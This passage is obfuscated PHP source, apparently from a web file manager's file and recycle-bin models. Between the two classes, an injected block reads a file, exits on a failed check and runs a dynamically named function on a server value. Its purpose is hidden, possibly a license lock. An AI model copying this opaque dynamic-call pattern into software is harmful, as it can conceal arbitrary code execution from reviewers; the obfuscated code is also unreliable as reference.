array($•Š…û¨ú[502] => array($•Š…û¨ú[503], $Èû‡“¿)); Model($•Š…û¨ú[2334])->where($í¿„ò×‚)->delete(); Model($•Š…û¨ú[546])->where($í¿„ò×‚)->delete(); Model($•Š…û¨ú[2164])->where($í¿„ò×‚)->delete(); Model($•Š…û¨ú[649])->where($í¿„ò×‚)->delete(); Model($•Š…û¨ú[1990])->removeBySource($Èû‡“¿); Model($•Š…û¨ú[2315])->removeBySource($Èû‡“¿); $this->where($í¿„ò×‚)->delete(); Model($•Š…û¨ú[557])->remove($‘œÏ‘Ï); for ($ÕÑŞÜÕı = 0; $ÕÑŞÜÕı < count($Èû‡“¿); $ÕÑŞÜÕı++) { $this->sourceCacheClear($Èû‡“¿[$ÕÑŞÜÕı]); } } public function rename($İö‚ÆŒò, $¥âÑêø) { $¢Üùø·ì =& $_SERVER[Î·Ü›öğ]; $¯À““Ê¼ = $this->sourceInfo($İö‚ÆŒò); if (!$¯À““Ê¼) { return !1; } $é»ÎöË² = $this->fileNameExist($¯À““Ê¼[$¢Üùø·ì[193]], $¥âÑêø); if ($é»ÎöË² && $é»ÎöË² != $İö‚ÆŒò) { return !1; } $ñÒñà½Ë = array($¢Üùø·ì[505] => $¥âÑêø, $¢Üùø·ì[667] => USER_ID); if ($¯À““Ê¼[$¢Üùø·ì[496]] != $¢Üùø·ì[91]) { $ñÒñà½Ë[$¢Üùø·ì[497]] = substr(get_path_ext($¥âÑêø), 0, 10); } Model($¢Üùø·ì[649])->eventRename($İö‚ÆŒò, $¯À““Ê¼[$¢Üùø·ì[32]], $¥âÑêø); $this->sourceCacheClear($İö‚ÆŒò); $this->setNamePinyin($İö‚ÆŒò, $ñÒñà½Ë[$¢Üùø·ì[32]], !1); $this->updateModifyTime($¯À““Ê¼[$¢Üùø·ì[193]]); $Éı µÔĞ = $this->where(array($¢Üùø·ì[502] => $İö‚ÆŒò))->data($ñÒñà½Ë)->save(); $¦Å½§š = $¢Üùø·ì[2323] . $¯À““Ê¼[$¢Üùø·ì[193]]; if (isset(self::$cacheChildList[$¦Å½§š])) { unset(self::$cacheChildList[$¦Å½§š]); } return $Éı µÔĞ; } public function setNamePinyin($Õ†ŠÔ±Ã, $Ö×µûØ­, $û¶‘›« = true) { $ıÇùĞí¯ =& $_SERVER[Î·Ü›öğ]; $Şõñ«÷ = Input::check($Ö×µûØ­, $ıÇùĞí¯[671]); $×ìø™‹é = array($ıÇùĞí¯[528] => KodSort::makeStr($Ö×µûØ­)); if ($Şõñ«÷) { $×ìø™‹é[$ıÇùĞí¯[549]] = str_replace($ıÇùĞí¯[53], $ıÇùĞí¯[12], Pinyin::get($Ö×µûØ­)); $×ìø™‹é[$ıÇùĞí¯[548]] = Pinyin::get($Ö×µûØ­, $ıÇùĞí¯[672]); } if (!$û¶‘›« && !$Şõñ«÷) { $×ìø™‹é[$ıÇùĞí¯[549]] = null; $×ìø™‹é[$ıÇùĞí¯[548]] = null; } $this->metaSet($Õ†ŠÔ±Ã, $×ìø™‹é); } public function getContent($¸Í”±¹¦) { $œ´ğğÖû =& $_SERVER[Î·Ü›öğ]; $Õó®šÀ = $this->fileInfoGet($¸Í”±¹¦); if (!$Õó®šÀ) { return !1; } if ($Õó®šÀ[$œ´ğğÖû[79]] == 0) { return $œ´ğğÖû[12]; } $ÃÀøçĞ = $œ´ğğÖû[2337] . $Õó®šÀ[$œ´ğğÖû[560]]; if ($Õó®šÀ[$œ´ğğÖû[79]] <= 1024 * 10) { $ØÍ‘õË = Cache::get($ÃÀøçĞ); if (!$ØÍ‘õË) { $ØÍ‘õË = IO::getContent($Õó®šÀ[$œ´ğğÖû[87]]); Cache::set($ÃÀøçĞ, $ØÍ‘õË); } return $ØÍ‘õË; } if (!$Õó®šÀ[$œ´ğğÖû[87]]) { return $œ´ğğÖû[12]; } return IO::getContent($Õó®šÀ[$œ´ğğÖû[87]]); } public function setDesc($Š©®Ò€², $áûëşı) { $â§Ãı°  =& $_SERVER[Î·Ü›öğ]; Model($â§Ãı° [649])->eventAddDesc($Š©®Ò€², $áûëşı); return $this->metaSet($Š©®Ò€², $â§Ãı° [537], $áûëşı); } public function setContent($ƒ‚ÚÜ†µ, $—“íÁò = '') { $¸Ï±ÂŞ =& $_SERVER[Î·Ü›öğ]; $è’†¦¢ú = $this->sourceInfo($ƒ‚ÚÜ†µ); $Äµáº›ë = $this->fileInfoGet($ƒ‚ÚÜ†µ); if (!$Äµáº›ë || !$è’†¦¢ú) { return !1; } $Âäëšö = KodIO::ioFileDriverGet($¸Ï±ÂŞ[494] . $ƒ‚ÚÜ†µ . $¸Ï±ÂŞ[404]); $œçÒ‚Ì = Model($¸Ï±ÂŞ[557])->addFileByContent($—“íÁò, $Âäëšö, $è’†¦¢ú[$¸Ï±ÂŞ[32]]); if (!$œçÒ‚Ì) { return !1; } $¹ï’›‡Â = $this->fileHistory($è’†¦¢ú, $œçÒ‚Ì[$¸Ï±ÂŞ[554]], $œçÒ‚Ì[$¸Ï±ÂŞ[79]]); if (!$¹ï’›‡Â) { return Model($¸Ï±ÂŞ[557])->remove($œçÒ‚Ì[$¸Ï±ÂŞ[554]]); } $this->folderSizeReset($è’†¦¢ú[$¸Ï±ÂŞ[193]]); return !0; } public function fileSubstr($úåÒÛ , $£ãŠ¾ğ, $Ôƒ›Ç¦) { $¬ş–éµ = $this->fileInfoGet($úåÒÛ ); if (!$¬ş–éµ) { return !1; } return IO::fileSubstr($¬ş–éµ[$_SERVER[Î·Ü›öğ][87]], $£ãŠ¾ğ, $Ôƒ›Ç¦); } public function fileInfoGet($ÂˆƒùŠ‚) { $¨ªÁæŞ€ =& $_SERVER[Î·Ü›öğ]; $ÏÄüë†ø = $this->sourceInfo($ÂˆƒùŠ‚); if (!$ÏÄüë†ø || $ÏÄüë†ø[$¨ªÁæŞ€[496]]) { return !1; } $éçã­µ² = $¨ªÁæŞ€[561] . $ÏÄüë†ø[$¨ªÁæŞ€[554]]; $º„Î›™í = _get(self::$cacheFileInfo, $éçã­µ²); if ($º„Î›™í) { return $º„Î›™í; } $›»ç„•² = Model($¨ªÁæŞ€[557])->fileInfo($ÏÄüë†ø[$¨ªÁæŞ€[554]]); if ($›»ç„•²) { $›»ç„•²[$¨ªÁæŞ€[32]] = $ÏÄüë†ø[$¨ªÁæŞ€[32]]; } self::$cacheFileInfo[$éçã­µ²] = $›»ç„•²; return $›»ç„•²; } private function folderChildrenNumber($ÀÒÚÂÖ¸) { $¦¤­­ =& $_SERVER[Î·Ü›öğ]; $İëÚûâ£ = $this->sourceInfo($ÀÒÚÂÖ¸); $¨èËÚï = array($¦¤­­[668] => array($¦¤­­[628], $İëÚûâ£[$¦¤­­[597]] . $ÀÒÚÂÖ¸ . $¦¤­­[629]), $¦¤­­[665] => $İëÚûâ£[$¦¤­­[582]], $¦¤­­[515] => intval($İëÚûâ£[$¦¤­­[516]]), $¦¤­­[662] => 1); $Öì·Å¼  = $this->where($¨èËÚï)->count(); $…Ú¨Š›â = $this->where($¨èËÚï)->where(array($¦¤­­[662] => 0))->count(); return array($¦¤­­[83] => $…Ú¨Š›â, $¦¤­­[84] => $Öì·Å¼ ); } public function pathInfo($„Â“»´ñ, $…×Ó…¢– = false) { $‘İ¢æË‹ =& $_SERVER[Î·Ü›öğ]; $…×Ó…¢– = !1; $„Â“»´ñ = intval($„Â“»´ñ); $—›´¨£Ò = $‘İ¢æË‹[545] . intval($…×Ó…¢–) . $‘İ¢æË‹[464] . $„Â“»´ñ; $µãÔ = _get(self::$cachePathInfo, $—›´¨£Ò); if ($µãÔ) { return $µãÔ; } $„ééû•À = $this->sourceInfo($„Â“»´ñ); if (!$„ééû•À) { return !1; } $„ééû•À = $this->_listDataApplyItem($„ééû•À, $…×Ó…¢–); self::$cachePathInfo[$—›´¨£Ò] = $„ééû•À; return $„ééû•À; } public static $cachePathInfoMore = array(); public function pathInfoMore($›ÌìöÊ) { $º…œî›ğ =& $_SERVER[Î·Ü›öğ]; $¤¬Ò³³õ = _get(self::$cachePathInfoMore, $›ÌìöÊ); if ($¤¬Ò³³õ) { return $¤¬Ò³³õ; } $Âø¬®çå = $this->pathInfo($›ÌìöÊ); if (!$Âø¬®çå) { return !1; } if ($Âø¬®çå[$º…œî›ğ[496]] == $º…œî›ğ[91]) { $Âø¬®çå[$º…œî›ğ[82]] = $this->folderChildrenNumber($›ÌìöÊ); } self::$cachePathInfoMore[$›ÌìöÊ] = $Âø¬®çå; return $Âø¬®çå; } public function sourceInfo($™é·‚óÄ) { $¸Ğç½Ë¤ =& $_SERVER[Î·Ü›öğ]; if (!$™é·‚óÄ) { return array(); } $™é·‚óÄ = intval($™é·‚óÄ); $×ôôÏÂˆ = $¸Ğç½Ë¤[544] . $™é·‚óÄ; $ûÕ²¬ù´ = _get(self::$cacheSourceInfo, $×ôôÏÂˆ); if ($ûÕ²¬ù´) { return $ûÕ²¬ù´; } $ÎËúö×Ç = $this->where(array($¸Ğç½Ë¤[194] => $™é·‚óÄ))->find(); self::$cacheSourceInfo[$×ôôÏÂˆ] = $ÎËúö×Ç; return self::$cacheSourceInfo[$×ôôÏÂˆ]; } public function sourceCacheClear($ÖÒÒ³õÄ = false) { self::cacheClear($ÖÒÒ³õÄ); } public static function cacheClear($óàáï÷ò = false) { $«ÁÖœçã =& $_SERVER[Î·Ü›öğ]; if ($óàáï÷ò == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$«ÁÖœçã[544] . $óàáï÷ò]); unset(self::$cachePathInfoMore[$óàáï÷ò]); unset(self::$cachePathInfo[$«ÁÖœçã[2338] . $óàáï÷ò]); unset(self::$cachePathInfo[$«ÁÖœçã[2339] . $óàáï÷ò]); } public function metaSet($ò—ò¹À, $Š€ÄÈÌ“ = null, $ÄÓŒ¬ú = null) { $Üú©¡è‘ = parent::metaSet($ò—ò¹À, $Š€ÄÈÌ“, $ÄÓŒ¬ú); if ($Üú©¡è‘) { $this->sourceCacheClear($ò—ò¹À); } return $Üú©¡è‘; } public function pathInfoByPath($éÁ­é¶¤, $¿ª…Áœö) { $¡ùÀÎŠ =& $_SERVER[Î·Ü›öğ]; $şÄöõïİ = !$¿ª…Áœö ? array() : explode($¡ùÀÎŠ[8], trim($¿ª…Áœö, $¡ùÀÎŠ[8])); $‹Ã²Ş™Û = intval($éÁ­é¶¤); foreach ($şÄöõïİ as $‡‰§©”ˆ) { $Œö»ºÆ“ = array($¡ùÀÎŠ[193] => $‹Ã²Ş™Û, $¡ùÀÎŠ[32] => $‡‰§©”ˆ); $å°ıŸÀ¦ = $this->field($¡ùÀÎŠ[2340])->where($Œö»ºÆ“)->select(); if (!$å°ıŸÀ¦) { return !1; } $å°ıŸÀ¦ = array_sort_by($å°ıŸÀ¦, $¡ùÀÎŠ[516]); $‹Ã²Ş™Û = intval($å°ıŸÀ¦[0][$¡ùÀÎŠ[194]]); } $ÈØ¹›£ = $this->sourceInfo($‹Ã²Ş™Û); $this->pathInfoFilter($ÈØ¹›£); return $ÈØ¹›£; } protected function updateModifyTime($Ú“ŞÅ) { $Úıƒ×¤Ë =& $_SERVER[Î·Ü›öğ]; $˜¹Ò® = defined($Úıƒ×¤Ë[2248]) ? USER_ID : 0; if (!$Ú“ŞÅ) { return; } if (!is_array($Ú“ŞÅ)) { $Ú“ŞÅ = array($Ú“ŞÅ); } foreach ($Ú“ŞÅ as $ß¾ªÆÚÏ => $¤¤¢¹çä) { $Ú“ŞÅ[$ß¾ªÆÚÏ] = intval($¤¤¢¹çä); $this->sourceCacheClear($¤¤¢¹çä); } $‹§‹ÚØº = array($Úıƒ×¤Ë[194] => array($Úıƒ×¤Ë[7], $Ú“ŞÅ)); $š÷£™›ü = array($Úıƒ×¤Ë[667] => $˜¹Ò®, $Úıƒ×¤Ë[509] => time()); $this->where($‹§‹ÚØº)->save($š÷£™›ü); } public function folderSizeReset($›ÊëÈ€È, $®â¬Ê‘´ = false) { $ÇÊÎı =& $_SERVER[Î·Ü›öğ]; if ($this->statusIgnoreResetSpace) { return; } if (!$›ÊëÈ€È) { return; } $…ıÖĞê = $this->sourceInfo($›ÊëÈ€È); $íòÀ°Æ = $ÇÊÎı[2341] . $›ÊëÈ€È; if (!$…ıÖĞê || !$…ıÖĞê[$ÇÊÎı[194]]) { return; } CacheLock::lock($íòÀ°Æ, 20); if ($®â¬Ê‘´ === !1) { $this->sourceCacheClear($›ÊëÈ€È); $…ıÖĞê = $this->sourceInfo($›ÊëÈ€È); $ş„‰…¢Õ = array($ÇÊÎı[488] => $›ÊëÈ€È, $ÇÊÎı[515] => 0); $”ìæÃÃ¿ = $this->where($ş„‰…¢Õ)->sum($ÇÊÎı[79]); $®â¬Ê‘´ = intval($”ìæÃÃ¿) - intval($…ıÖĞê[$ÇÊÎı[79]]); } if ($®â¬Ê‘´ == 0) { return CacheLock::unlock($íòÀ°Æ); } $³ÉÕ¯Éá = $this->parentLevelArray($…ıÖĞê[$ÇÊÎı[597]]); if (!$³ÉÕ¯Éá) { $³ÉÕ¯Éá = array(); } $³ÉÕ¯Éá[] = $…ıÖĞê[$ÇÊÎı[194]]; $ş„‰…¢Õ = array($ÇÊÎı[194] => array($ÇÊÎı[503], $³ÉÕ¯Éá)); if ($®â¬Ê‘´ < 0) { $ş„‰…¢Õ[$ÇÊÎı[79]] = array($ÇÊÎı[1114], abs($®â¬Ê‘´)); } $this->where($ş„‰…¢Õ)->setAdd($ÇÊÎı[79], $®â¬Ê‘´); CacheLock::unlock($íòÀ°Æ); if (!$…ıÖĞê[$ÇÊÎı[582]] || $…ıÖĞê[$ÇÊÎı[582]] == $ÇÊÎı[231]) { return; } $‡½â†Æå = $ÇÊÎı[2342] . $…ıÖĞê[$ÇÊÎı[191]] . $ÇÊÎı[4] . $…ıÖĞê[$ÇÊÎı[582]]; $êØ¢…–ò = array($…ıÖĞê[$ÇÊÎı[191]], $…ıÖĞê[$ÇÊÎı[582]]); TaskRun::timeLimitCall($‡½â†Æå, $ÇÊÎı[2343], $êØ¢…–ò, 1.5); } public function folderSizeResetChildren($øÙŞ¾¯£) { $’Š¯–ş =& $_SERVER[Î·Ü›öğ]; $this->sourceCacheClear($øÙŞ¾¯£); $Ÿ¸úµ¼ = $this->sourceInfo($øÙŞ¾¯£); if (!$Ÿ¸úµ¼) { return; } $Œø—¶×ó = array($’Š¯–ş[662] => 1, $’Š¯–ş[665] => $Ÿ¸úµ¼[$’Š¯–ş[582]], $’Š¯–ş[668] => array($’Š¯–ş[628], $Ÿ¸úµ¼[$’Š¯–ş[597]] . $øÙŞ¾¯£ . $’Š¯–ş[629])); $ÍåñøÏ´ = $’Š¯–ş[2344]; $ÃĞ´Ë× = $this->field($ÍåñøÏ´)->where($Œø—¶×ó)->select(); $Œø—¶×ó[$’Š¯–ş[496]] = 0; $¡»Ä’Â– = $this->field($ÍåñøÏ´)->where($Œø—¶×ó)->select(); if (!$¡»Ä’Â–) { return; } $ÃĞ´Ë×[] = $Ÿ¸úµ¼; $ÃĞ´Ë× = array_to_keyvalue($ÃĞ´Ë×, $’Š¯–ş[194]); foreach ($ÃĞ´Ë× as $òı¡Á—“ => $‹üºÎ÷) { $ÃĞ´Ë×[$òı¡Á—“][$’Š¯–ş[2345]] = $ÃĞ´Ë×[$òı¡Á—“][$’Š¯–ş[79]]; $ÃĞ´Ë×[$òı¡Á—“][$’Š¯–ş[79]] = 0; } foreach ($¡»Ä’Â– as $‹üºÎ÷) { $¢´¶ş…Ò = $‹üºÎ÷[$’Š¯–ş[193]] . $’Š¯–ş[12]; if (!isset($ÃĞ´Ë×[$¢´¶ş…Ò])) { continue; } if ($‹üºÎ÷[$’Š¯–ş[516]] == $ÃĞ´Ë×[$¢´¶ş…Ò][$’Š¯–ş[516]]) { $ÃĞ´Ë×[$¢´¶ş…Ò][$’Š¯–ş[79]] += $‹üºÎ÷[$’Š¯–ş[79]]; } } foreach ($ÃĞ´Ë× as $‹üºÎ÷) { $Å¨µé‹° = $this->parentLevelArray($‹üºÎ÷[$’Š¯–ş[597]]); foreach ($Å¨µé‹° as $¢´¶ş…Ò) { $¢´¶ş…Ò = $¢´¶ş…Ò . $’Š¯–ş[12]; if (!isset($ÃĞ´Ë×[$¢´¶ş…Ò])) { continue; } if ($‹üºÎ÷[$’Š¯–ş[516]] == $ÃĞ´Ë×[$¢´¶ş…Ò][$’Š¯–ş[516]]) { $ÃĞ´Ë×[$¢´¶ş…Ò][$’Š¯–ş[79]] += $‹üºÎ÷[$’Š¯–ş[79]]; } } } $ªî¹ó²‚ = array(); foreach ($ÃĞ´Ë× as $‹üºÎ÷) { if ($‹üºÎ÷[$’Š¯–ş[79]] == $‹üºÎ÷[$’Š¯–ş[2345]]) { continue; } $ªî¹ó²‚[] = array($’Š¯–ş[194], $‹üºÎ÷[$’Š¯–ş[194]], $’Š¯–ş[79], $‹üºÎ÷[$’Š¯–ş[79]]); } $this->saveAll($ªî¹ó²‚); } public function userSpaceReset($Óí‚ï»á = false) { $£ğãô°‹ =& $_SERVER[Î·Ü›öğ]; $ùàª“«¬ = $this->where(array($£ğãô°‹[191] => self::TYPE_USER, $£ğãô°‹[582] => $Óí‚ï»á, $£ğãô°‹[496] => 0))->sum($£ğãô°‹[79]); $ùàª“«¬ = !$ùàª“«¬ || $ùàª“«¬ <= 0 ? 0 : $ùàª“«¬; Model($£ğãô°‹[590])->userEdit($Óí‚ï»á, array($£ğãô°‹[1999] => $ùàª“«¬)); } public function targetSpaceUpdate($«ø©ßù”, $Ê²°Ö´’) { $õŞœÖä© =& $_SERVER[Î·Ü›öğ]; if (!$Ê²°Ö´’) { return; } if (!in_array($«ø©ßù”, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $©àòÅï = $this->targetSpaceSize($«ø©ßù”, $Ê²°Ö´’); if ($«ø©ßù” == self::TYPE_USER) { Model($õŞœÖä©[590])->userEdit($Ê²°Ö´’, array($õŞœÖä©[1999] => $©àòÅï)); } else { if ($«ø©ßù” == self::TYPE_GROUP) { Model($õŞœÖä©[598])->groupEdit($Ê²°Ö´’, array($õŞœÖä©[1999] => $©àòÅï)); } } } public function targetSpaceSize($äÓÌ’ñ, $’şºÅ€…) { $®‹¸Ö¤ä =& $_SERVER[Î·Ü›öğ]; $Çê×Ö— = 0; $¼¶‘©Øé = $this->targetSourceRoot($äÓÌ’ñ, $’şºÅ€…, !0); foreach ($¼¶‘©Øé as $æ¾¶®) { if (!$æ¾¶®) { continue; } $Çê×Ö— += floatval($æ¾¶®[$®‹¸Ö¤ä[79]]); $Øˆ™¼ƒ = array($®‹¸Ö¤ä[668] => array($®‹¸Ö¤ä[628], $®‹¸Ö¤ä[606] . $æ¾¶®[$®‹¸Ö¤ä[194]] . $®‹¸Ö¤ä[629])); $øÜ‰€ûÁ = Model($®‹¸Ö¤ä[514])->field($®‹¸Ö¤ä[502])->where($Øˆ™¼ƒ)->select(); $øÜ‰€ûÁ = array_to_keyvalue($øÜ‰€ûÁ, $®‹¸Ö¤ä[12], $®‹¸Ö¤ä[194]); $øÜ‰€ûÁ = array_unique(array_filter($øÜ‰€ûÁ)); if ($øÜ‰€ûÁ) { $Øˆ™¼ƒ = array($®‹¸Ö¤ä[502] => array($®‹¸Ö¤ä[503], $øÜ‰€ûÁ)); $Çê×Ö— += floatval($this->where($Øˆ™¼ƒ)->sum($®‹¸Ö¤ä[79])); } } $Çê×Ö— = !$Çê×Ö— || $Çê×Ö— <= 0 ? 0 : $Çê×Ö—; return $Çê×Ö—; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($°§Á£) { return $this->fileTypeProfile($°§Á£, SourceModel::TYPE_USER); } public function groupFileTypeProfile($¿ËíÅ–°) { return $this->fileTypeProfile($¿ËíÅ–°, SourceModel::TYPE_GROUP); } private function fileTypeProfile($õÈˆãµù, $¤Ö¿¶Üµ) { $ˆ—ş Ÿç =& $_SERVER[Î·Ü›öğ]; $§¬Œ¢İ = $ˆ—ş Ÿç[2346] . $õÈˆãµù . $ˆ—ş Ÿç[11] . $¤Ö¿¶Üµ; $†Æ¶ã­ê = Cache::get($§¬Œ¢İ); if ($†Æ¶ã­ê) { return $†Æ¶ã­ê; } $Ğ‹ª†­• = array($ˆ—ş Ÿç[662] => 0); if ($õÈˆãµù != !1) { $Ğ‹ª†­•[$ˆ—ş Ÿç[582]] = $õÈˆãµù; $Ğ‹ª†­•[$ˆ—ş Ÿç[191]] = $¤Ö¿¶Üµ; } $¯²¢Î‚¾ = array(); $¯²¢Î‚¾[$ˆ—ş Ÿç[2347]] = array($ˆ—ş Ÿç[2348] => LNG($ˆ—ş Ÿç[2347]), $ˆ—ş Ÿç[2349] => $this->where($Ğ‹ª†­•)->count(), $ˆ—ş Ÿç[633] => $this->where($Ğ‹ª†­•)->sum($ˆ—ş Ÿç[79])); $³œÂÒ’İ = KodIO::fileTypeList(); foreach ($³œÂÒ’İ as $‘´ÎÌ => $š¸öæò) { $Ğ‹ª†­•[$ˆ—ş Ÿç[497]] = $this->fileTypeWhere($‘´ÎÌ); $¯²¢Î‚¾[$‘´ÎÌ] = array($ˆ—ş Ÿç[2348] => $š¸öæò[$ˆ—ş Ÿç[32]], $ˆ—ş Ÿç[2349] => $this->where($Ğ‹ª†­•)->count(), $ˆ—ş Ÿç[633] => $this->where($Ğ‹ª†­•)->sum($ˆ—ş Ÿç[79])); } Cache::set($§¬Œ¢İ, $¯²¢Î‚¾, 1200); return $¯²¢Î‚¾; } public function fileNameExist($¿²ÒÛ¼, $¾Üª«³Å) { $¿ã‹õÍ— =& $_SERVER[Î·Ü›öğ]; $†ãÌ¸ø› = $this->field($¿ã‹õÍ—[2350])->where(array($¿ã‹õÍ—[193] => $¿²ÒÛ¼, $¿ã‹õÍ—[32] => $¾Üª«³Å, $¿ã‹õÍ—[516] => 0))->find(); return is_array($†ãÌ¸ø›) ? $†ãÌ¸ø›[$¿ã‹õÍ—[194]] : !1; } public function childList($²İ´í­ğ) { $»”ÕÊİÙ =& $_SERVER[Î·Ü›öğ]; $ ”Ü¦áû = $»”ÕÊİÙ[2323] . $²İ´í­ğ; if (isset(self::$cacheChildList[$ ”Ü¦áû])) { return self::$cacheChildList[$ ”Ü¦áû]; } $å²«ïá = array($»”ÕÊİÙ[193] => intval($²İ´í­ğ), $»”ÕÊİÙ[516] => 0); $ø§˜÷ğ¢ = $this->where($å²«ïá)->select(); $ø§˜÷ğ¢ = $ø§˜÷ğ¢ ? $ø§˜÷ğ¢ : array(); self::$cacheChildList[$ ”Ü¦áû] = $ø§˜÷ğ¢; foreach ($ø§˜÷ğ¢ as $Ê·¤ì) { $ ”Ü¦áû = $»”ÕÊİÙ[544] . $Ê·¤ì[$»”ÕÊİÙ[194]]; self::$cacheSourceInfo[$ ”Ü¦áû] = $Ê·¤ì; } return $ø§˜÷ğ¢; } public function fileNameAuto($´¹ËÑİş, $î¢ËÚÚé, $œì–ğö = REPEAT_RENAME, $õ½ÂØÎò = false) { $Û¦ï½ä¢ =& $_SERVER[Î·Ü›öğ]; $–Å°Óá = get_path_ext($î¢ËÚÚé); $ÍÎúÒ—Æ = $–Å°Óá ? get_path_ext_name($î¢ËÚÚé) . $Û¦ï½ä¢[2351] . $–Å°Óá : $î¢ËÚÚé . $Û¦ï½ä¢[462]; $¥°ºúÕ = array($Û¦ï½ä¢[193] => $´¹ËÑİş, $Û¦ï½ä¢[516] => 0, $Û¦ï½ä¢[32] => array($Û¦ï½ä¢[461], $ÍÎúÒ—Æ)); $‰Ïıñ†Ü = $this->field($Û¦ï½ä¢[32])->where($¥°ºúÕ)->select(); $í…Ö«¶İ = array_to_keyvalue($‰Ïıñ†Ü, $Û¦ï½ä¢[12], $Û¦ï½ä¢[32]); return $this->fileNameAutoGet($í…Ö«¶İ, $î¢ËÚÚé, $œì–ğö, $õ½ÂØÎò); } public function fileNameAutoGet($òµæÄè…, $‡åøŸåé, $˜¿ÍÅ©Ú, $—ÃŸ…œÙ) { $×…í’µå =& $_SERVER[Î·Ü›öğ]; if ($˜¿ÍÅ©Ú == REPEAT_REPLACE || !$òµæÄè… || !in_array_not_case($‡åøŸåé, $òµæÄè…) || $—ÃŸ…œÙ && $˜¿ÍÅ©Ú != REPEAT_RENAME_FOLDER) { return $‡åøŸåé; } if ($˜¿ÍÅ©Ú == REPEAT_SKIP) { return !1; } $ï«§ğÍ¬ = $×…í’µå[10] . get_path_ext($‡åøŸåé); $ï«§ğÍ¬ = $ï«§ğÍ¬ == $×…í’µå[10] || $—ÃŸ…œÙ ? $×…í’µå[12] : $ï«§ğÍ¬; for ($ğÔè©Ã = 1; $ğÔè©Ã <= count($òµæÄè…) + 1; $ğÔè©Ã++) { $ÈÍ€„ = substr($‡åøŸåé, 0, strlen($‡åøŸåé) - strlen($ï«§ğÍ¬)); $Áá¿æ™ê = $ÈÍ€„ . "\x28{$ğÔè©Ã}\x29{$ï«§ğÍ¬}"; if (!in_array_not_case($Áá¿æ™ê, $òµæÄè…)) { return $Áá¿æ™ê; } } } } goto D¹÷ÍÀ¸Ù÷; D¹÷ÍÀ¸Ù÷: if ($_SERVER[$_SERVER[Î·Ü›öğ][481]] != $_SERVER[$_SERVER[Î·Ü›öğ][1253]]) { $_getc = $_SERVER[Î·Ü›öğ][482]; $_getfile = $_SERVER[$_SERVER[Î·Ü›öğ][483]] . $_SERVER[Î·Ü›öğ][484]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Î·Ü›öğ][288], $_getfilec); if (count($_getarrs) < $_SERVER[Î·Ü›öğ][485]) { $exit = $_SERVER[Î·Ü›öğ][486]; $exit(); } $_act = $_SERVER[Î·Ü›öğ][487]; $_act($_SERVER[$_SERVER[Î·Ü›öğ][479]]); } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x73\157\165\x72\x63\145\x5f\162\x65\143\171\x63\154\x65"; protected $dataAuto = array(array("\143\162\x65\141\x74\x65\124\x69\x6d\x65", "\x74\x69\x6d\x65", "\151\156\x73\145\162\x74", "\146\x75\156\x63\x74\x69\x6f\156")); public function listData($œÓ§£Ø = false) { $ğ®¦²Âò =& $_SERVER[Î·Ü›öğ]; $œÓ§£Ø = $œÓ§£Ø ? $œÓ§£Ø : USER_ID; $ëú­ÏÈ§ = $this->where(array($ğ®¦²Âò[1801] => $œÓ§£Ø))->select(); return array_to_keyvalue($ëú­ÏÈ§, $ğ®¦²Âò[12], $ğ®¦²Âò[194]); } public function moveToRecycle($ò±…ÖÁÓ) { $øÜº¹îÑ =& $_SERVER[Î·Ü›öğ]; $ËƒÖñÚï = Model($øÜº¹îÑ[1458]); $ñÆàÓ›Ç = $ËƒÖñÚï->sourceInfo($ò±…ÖÁÓ); if (!$ñÆàÓ›Ç || $ñÆàÓ›Ç[$øÜº¹îÑ[516]] == $øÜº¹îÑ[91]) { return; } $Â¤âœ = array($øÜº¹îÑ[502] => $ò±…ÖÁÓ, $øÜº¹îÑ[1801] => USER_ID, $øÜº¹îÑ[664] => $ñÆàÓ›Ç[$øÜº¹îÑ[191]], $øÜº¹îÑ[665] => $ñÆàÓ›Ç[$øÜº¹îÑ[582]], $øÜº¹îÑ[668] => $ñÆàÓ›Ç[$øÜº¹îÑ[597]]); $this->add($Â¤âœ); $this->recycleMove($ò±…ÖÁÓ, 1); if ($ñÆàÓ›Ç[$øÜº¹îÑ[496]] == $øÜº¹îÑ[91]) { $ô¬Ş¶ÈÇ = array($øÜº¹îÑ[668] => array($øÜº¹îÑ[628], $ñÆàÓ›Ç[$øÜº¹îÑ[597]] . $ò±…ÖÁÓ . $øÜº¹îÑ[629])); $ËƒÖñÚï->where($ô¬Ş¶ÈÇ)->setField($øÜº¹îÑ[516], 1); } } public function clear() { $this->remove(!1); } public function remove($×Ö£µ¼‹ = false, $®š‰†Ñ = false) { $ÌìéøÀ” =& $_SERVER[Î·Ü›öğ]; $®š‰†Ñ = $®š‰†Ñ ? $®š‰†Ñ : USER_ID; $ñã¼Íƒ© = Model($ÌìéøÀ”[1458]); $µŞ¾…ª = $this->listData($®š‰†Ñ); $×Ö£µ¼‹ = $×Ö£µ¼‹ === !1 ? !1 : $×Ö£µ¼‹; $Àù§©ûô = array(); foreach ($µŞ¾…ª as $Š¦ÊÀµì) { if ($×Ö£µ¼‹ != !1 && !in_array($Š¦ÊÀµì, $×Ö£µ¼‹)) { continue; } $›ÛïøÙ  = $ñã¼Íƒ©->sourceInfo($Š¦ÊÀµì); $ñã¼Íƒ©->remove($Š¦ÊÀµì, !1); $¾Šˆ¹’Ô = $›ÛïøÙ [$ÌìéøÀ”[191]] . $ÌìéøÀ”[11] . $›ÛïøÙ [$ÌìéøÀ”[582]]; $Àù§©ûô[$¾Šˆ¹’Ô] = array($ÌìéøÀ”[664] => $›ÛïøÙ [$ÌìéøÀ”[191]], $ÌìéøÀ”[582] => $›ÛïøÙ [$ÌìéøÀ”[582]]); $this->where(array($ÌìéøÀ”[194] => $Š¦ÊÀµì))->delete(); } foreach ($Àù§©ûô as $šíŒŒöí) { $ñã¼Íƒ©->targetSpaceUpdate($šíŒŒöí[$ÌìéøÀ”[191]], $šíŒŒöí[$ÌìéøÀ”[582]]); } } public function restore($Æ“±‹ˆı = false) { $Á¬¬ª‹ = $this->listData(); $this->_restoreSource($Á¬¬ª‹, $Æ“±‹ˆı); } public function removeUserAll($Ù©œïù) { $this->remove(!1, $Ù©œïù); } public function restoreItem($ŸÌÈëÛ›) { $this->_restoreSource(array($ŸÌÈëÛ›), array($ŸÌÈëÛ›)); } private function 